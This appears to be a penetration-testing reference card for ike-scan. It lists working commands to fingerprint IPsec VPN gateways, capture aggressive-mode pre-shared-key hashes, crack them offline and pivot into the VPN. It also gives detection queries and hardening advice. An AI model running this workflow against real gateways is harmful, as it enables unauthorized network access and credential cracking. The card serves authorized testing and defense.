name: ike-scan - IPsec VPN Discovery & PSK Capture
description: ike-scan discovers and fingerprints IPsec VPN gateways (IKE/ISAKMP on UDP 500) and can capture the aggressive-mode PSK hash for offline cracking. It identifies the VPN vendor from handshake behavior and detects aggressive mode, a classic misconfiguration that leaks a crackable pre-shared key. A core step when a UDP 500 service is found.
notes:
=== DISCOVER / FINGERPRINT (main mode) ===
  ike-scan -M <target>
  ike-scan -M <target> --showbackoff   # vendor fingerprint via backoff pattern

=== DETECT AGGRESSIVE MODE (the win) ===
  ike-scan -M -A <target>
  # If it responds, aggressive mode is enabled -> PSK hash is exposed

=== CAPTURE THE PSK HASH FOR CRACKING ===
  ike-scan -M -A --pskcrack=psk.txt <target>
  ike-scan -M -A --id=<group_id> --pskcrack=psk.txt <target>

=== CRACK THE PSK OFFLINE ===
  psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
  psk-crack -b 5 psk.txt           # brute force length 5
  # or convert and use hashcat -m 5300 (IKE-PSK MD5) / 5400 (SHA1)

=== ENUMERATE VALID GROUP NAMES (ID) ===
  for id in $(cat groups.txt); do ike-scan -M -A --id=$id <target>; done

=== CHECK THE PORT FIRST ===
  nmap -sU -p500 <target>

=== AFTER CRACKING PSK ===
  # Use the PSK + a known username to connect (xauth) and pivot into the VPN

=== ALTERNATIVES ===
  nmap --script ike-version
  strongSwan / openswan client to connect once PSK is known

recommended.note: Find UDP 500 / the VPN service first.
Connect to the VPN once the PSK is cracked.

defense.why_it_works: IKE aggressive mode sends a hash of the pre-shared key in the initial exchange before authentication completes, letting any client capture it for offline cracking. ike-scan also fingerprints vendors from timing/backoff behavior.
defense.prerequisites: Reachable IKE/ISAKMP service (UDP 500); aggressive mode enabled for PSK capture.
defense.impact: Recovery of the VPN pre-shared key, enabling VPN access and internal network pivoting.
defense.detection: [MITRE T1046/T1110.002] IKE main+aggressive mode probes from one source; many ISAKMP requests with varying group IDs; UDP 500 scanning.
defense.artifacts: VPN gateway logs of aggressive-mode negotiations from unexpected IPs; IKE probe bursts.
defense.splunk_spl:
index=network dest_port=500 transport=udp
| stats count by src_ip, dest_ip
| where count > 10
defense.sentinel_kql:
DeviceNetworkEvents
| where RemotePort == 500 and Protocol == "Udp"
| summarize count() by RemoteIP, DeviceName, bin(Timestamp, 10m)
| where count_ > 10
defense.prevention: Disable IKE aggressive mode (use main mode); use certificate auth instead of PSK; strong/long PSKs if unavoidable; restrict VPN endpoints by source; monitor ISAKMP negotiation anomalies; prefer IKEv2.
